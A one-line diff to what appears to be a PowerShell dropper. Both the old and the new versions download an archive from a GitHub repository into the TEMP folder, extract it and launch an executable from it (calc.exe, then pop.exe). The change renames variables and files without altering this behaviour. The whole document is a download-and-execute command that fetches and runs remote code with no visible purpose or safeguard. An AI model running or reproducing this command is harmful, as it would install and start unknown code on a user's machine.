@@ -1,1 +1,1 @@
-$w = New-Object Net.WebClient; $t = "$env:TEMP\extracted_files"; $w.DownloadFile('https://github.com/forsaken0127/Rust/raw/main/file.cab', "$t\file.cab"); Expand-Archive -Path "$t\file.cab" -DestinationPath $t -Force; Start-Process -FilePath "$t\calc.exe"
+$webClient = New-Object Net.WebClient; $tempDir = "$env:TEMP\extracted_files"; $webClient.DownloadFile('https://github.com/forsaken0127/Rust/raw/main/file.rar', "$tempDir\file.rar"); Expand-Archive -Path "$tempDir\file.rar" -DestinationPath $tempDir -Force; Start-Process -FilePath "$tempDir\pop.exe"
